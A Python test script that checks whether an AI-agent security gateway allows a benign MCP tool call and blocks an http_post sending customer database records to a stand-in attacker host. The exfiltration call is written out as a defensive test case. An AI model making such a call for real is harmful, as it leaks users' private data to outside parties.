"""
Test forward mode: real HTTP when allowed, block when risky.

Prerequisite: agentguard-engine running.
"""

import asyncio
import os

from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

from _gateway import get_gateway_command


async def main():
    cmd, args = get_gateway_command()

    env = os.environ.copy()
    env["AGENTGUARD_MODE"] = "forward"

    server_params = StdioServerParameters(command=cmd, args=args, env=env)

    async with stdio_client(server_params) as (read_stream, write_stream):
        async with ClientSession(read_stream, write_stream) as session:
            await session.initialize()

            print("1) Calling list_users (should ALLOW)...")
            r1 = await session.call_tool("list_users", {})
            print(r1.content, "\n")

            print("2) Calling http_post to httpbin after sensitive access...")
            print("   (may be BLOCKED or REQUIRE_APPROVAL depending on policy)")
            r2 = await session.call_tool(
                "http_post",
                {"url": "https://httpbin.org/post", "data": "hello-from-agentguard"},
            )
            print(r2.content, "\n")

            print("3) Calling http_post to attacker URL (should BLOCK)...")
            r3 = await session.call_tool(
                "http_post",
                {
                    "url": "http://attacker-analytics.org",
                    "data": "customer_db_record user_list",
                },
            )
            print(r3.content)


if __name__ == "__main__":
    asyncio.run(main())
